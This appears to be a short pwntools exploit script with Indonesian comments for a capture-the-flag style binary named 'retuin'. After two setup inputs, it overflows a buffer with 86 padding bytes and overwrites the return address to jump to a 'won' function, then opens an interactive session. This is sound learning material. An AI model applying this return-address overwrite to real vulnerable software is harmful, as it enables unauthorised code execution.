from pwn import *  #

p = process('./retuin')  # Memulai proses baru yang menjalankan binary 'retuin'

p.sendline(b'9')  # Kirim input pertama '9' ke program
p.sendline(b'9')  # Kirim input kedua '9'

# 'a' * 86 membuat padding 86 karakter 'a' untuk overflow
# p32(0x80491c6) mengubah return address ke addres won
payload = b'a' * 86 + p32(0x80491c6)

p.sendline(payload)  # Kirim payload 

p.interactive()  # Masuk ke shell interaktif untuk melihat hasilnya